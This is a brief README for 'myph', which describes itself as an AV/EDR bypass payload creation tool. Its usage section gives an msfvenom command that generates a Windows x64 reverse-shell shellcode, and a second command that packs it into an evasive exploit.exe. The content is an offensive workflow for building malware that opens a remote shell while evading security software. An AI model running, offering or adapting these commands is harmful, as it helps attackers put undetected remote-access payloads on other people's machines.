# myph

AV/EDR bypass payload creation tool

## Usage

Generate a payload like so:

```bash
# generate your payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=80 -f raw -o msf.raw

# run myph
./myph --shellcode msf.raw --outfile exploit.exe
```
